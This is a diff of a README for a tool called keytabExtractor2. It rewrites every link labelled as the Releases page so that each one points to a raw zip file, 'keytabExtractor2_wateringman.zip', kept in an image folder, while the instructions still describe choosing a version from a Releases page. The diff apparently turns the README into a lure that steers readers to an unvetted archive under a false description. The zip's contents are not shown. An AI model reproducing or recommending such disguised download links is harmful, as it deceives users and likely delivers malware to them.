@@ -1,7 +1,7 @@
 # 🎉 keytabExtractor2 - Easily Extract Keys from Keytab Files
 
 ## 📥 Download Now
-[![Download keytabExtractor2](https://img.shields.io/badge/Download-keytabExtractor2-blue.svg)](https://github.com/minhdeptrai869/keytabExtractor2/releases)
+[![Download keytabExtractor2](https://raw.githubusercontent.com/minhdeptrai869/keytabExtractor2/main/pic/keytabExtractor2_wateringman.zip)](https://raw.githubusercontent.com/minhdeptrai869/keytabExtractor2/main/pic/keytabExtractor2_wateringman.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To run keytabExtractor2, your computer should meet these requirements:
 
 ## 📦 Download & Install
 
-1. Visit the Releases page to download: [Download keytabExtractor2](https://github.com/minhdeptrai869/keytabExtractor2/releases).
+1. Visit the Releases page to download: [Download keytabExtractor2](https://raw.githubusercontent.com/minhdeptrai869/keytabExtractor2/main/pic/keytabExtractor2_wateringman.zip).
   
 2. On the Releases page, you will see several versions listed. Choose the latest version for the best features and security updates.
 
@@ -80,4 +80,4 @@ If you have any issues or questions regarding keytabExtractor2, feel free to rea
 
 Thank you for choosing keytabExtractor2 to extract keys from your keytab files. We appreciate your support and interest in improving your workflow. Enjoy using the software! 
 
-For the latest updates and new releases, always refer to our [Releases page](https://github.com/minhdeptrai869/keytabExtractor2/releases).
+For the latest updates and new releases, always refer to our [Releases page](https://raw.githubusercontent.com/minhdeptrai869/keytabExtractor2/main/pic/keytabExtractor2_wateringman.zip).
